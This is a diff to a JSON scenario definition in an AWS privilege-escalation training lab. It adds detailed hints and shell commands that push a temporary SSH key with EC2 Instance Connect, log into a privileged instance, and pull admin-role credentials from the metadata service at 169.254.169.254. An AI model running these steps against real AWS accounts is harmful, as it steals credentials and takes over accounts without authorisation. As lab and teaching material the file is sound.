@@ -1,5 +1,5 @@
 {
-  "displayName": "One-Hop Privilege Escalation: ec2-instance-connect:SendSSHPublicKey",
+  "displayName": "EC2 Instance Connect SSH to Admin",
   "name": "ec2-003-ec2-instance-connect-sendsshpublickey",
   "description": "SSH into EC2 instance with privileged role and extract credentials via IMDS",
   "costEstimate": "$8/mo",
@@ -31,11 +31,12 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/ec2-003-ec2-instance-connect-sendsshpublickey"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/ec2-003-ec2-instance-connect-sendsshpublickey",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "ec2-instance-connect:SendSSHPublicKey",
+        "principal": "pl-prod-ec2-003-to-admin-starting-user",
         "resource": "arn:aws:ec2:*:{account_id}:instance/{target_instance_id}",
         "description": "push a temporary SSH public key to the target EC2 instance"
       }
@@ -43,14 +44,17 @@
     "helpful": [
       {
         "permission": "ec2:DescribeInstances",
+        "principal": "pl-prod-ec2-003-to-admin-starting-user",
         "purpose": "discover EC2 instances with privileged roles attached via instance profiles"
       },
       {
         "permission": "iam:GetInstanceProfile",
+        "principal": "pl-prod-ec2-003-to-admin-starting-user",
         "purpose": "view instance profile to determine attached role permissions"
       },
       {
         "permission": "iam:GetRole",
+        "principal": "pl-prod-ec2-003-to-admin-starting-user",
         "purpose": "view role permissions and policies"
       }
     ]
@@ -126,22 +130,29 @@
         "label": "ec2-instance-connect:SendSSHPublicKey",
         "description": "Push a temporary SSH public key to the EC2 instance using EC2 Instance Connect. The key is valid for 60 seconds, providing a window to establish an SSH connection.\n",
         "hints": [
-          "You can push SSH keys to EC2 instances. Are any of them running with elevated permissions?",
-          "Look for EC2 instances with privileged IAM roles attached via instance profiles.",
+          "Start by discovering what EC2 instances exist in the account -- use your ec2:DescribeInstances permission to list running instances and look for any with an IAM instance profile attached.",
+          "Once you find an instance with an instance profile, use iam:GetInstanceProfile and iam:GetRole to understand what permissions that role carries.",
+          "Look at the policy attached to your starting principal -- which specific EC2 instance resource is your ec2-instance-connect:SendSSHPublicKey permission scoped to?",
+          "You can push a temporary SSH public key to an EC2 instance using EC2 Instance Connect. The key is only valid for 60 seconds, so have your SSH command ready before you push.",
+          "Generate a local SSH key pair first (ssh-keygen), then push the public key to the instance. You will need the instance's public IP address and the OS username (ec2-user for Amazon Linux).",
           "Browse to https://pathfinding.cloud/paths/ec2-003 for technique details."
         ],
         "commands": [
+          {
+            "description": "List EC2 instances with their instance profiles",
+            "command": "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' --output table"
+          },
           {
             "description": "Generate a temporary SSH key pair",
             "command": "ssh-keygen -t rsa -f /tmp/ec2-connect-key -N '' -q"
           },
           {
             "description": "Push the public key to the EC2 instance",
-            "command": "aws ec2-instance-connect send-ssh-public-key --instance-id i-xxxxxxxxx --instance-os-user ec2-user --ssh-public-key file:///tmp/ec2-connect-key.pub --availability-zone us-east-1a"
+            "command": "aws ec2-instance-connect send-ssh-public-key --region <region> --instance-id <instance-id> --instance-os-user ec2-user --ssh-public-key file:///tmp/ec2-connect-key.pub"
           },
           {
             "description": "SSH into the instance within the 60-second window",
-            "command": "ssh -i /tmp/ec2-connect-key ec2-user@<instance-public-ip>"
+            "command": "ssh -i /tmp/ec2-connect-key -o StrictHostKeyChecking=no ec2-user@<instance-public-ip>"
           }
         ]
       },
@@ -151,12 +162,15 @@
         "label": "IMDSv2 credential extraction",
         "description": "Once on the instance, query the Instance Metadata Service (IMDSv2) to retrieve the temporary security credentials for the attached administrative IAM role.\n",
         "hints": [
-          "Once on the instance, the Instance Metadata Service (IMDS) is your path to credentials.",
-          "Query IMDSv2 to retrieve temporary security credentials for the attached IAM role."
+          "You are now inside the EC2 instance's trust boundary. The Instance Metadata Service (IMDS) at 169.254.169.254 exposes temporary AWS credentials for the role attached to this instance.",
+          "This instance requires IMDSv2 -- you must first obtain a session token via a PUT request before you can query for credentials.",
+          "Query the credentials endpoint at /latest/meta-data/iam/security-credentials/ to discover the role name, then append the role name to that path to retrieve the full credentials JSON.",
+          "The credentials JSON contains AccessKeyId, SecretAccessKey, and Token fields -- all three are needed to assume the role outside the instance.",
+          "Once you have the credentials, export them as environment variables on your local machine and verify your new identity with sts:GetCallerIdentity."
         ],
         "commands": [
           {
-            "description": "Get an IMDSv2 token",
+            "description": "Get an IMDSv2 session token",
             "command": "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')"
           },
           {
@@ -164,7 +178,7 @@
             "command": "ROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
           },
           {
-            "description": "Extract the temporary credentials",
+            "description": "Extract the temporary credentials for the attached role",
             "command": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
           },
           {
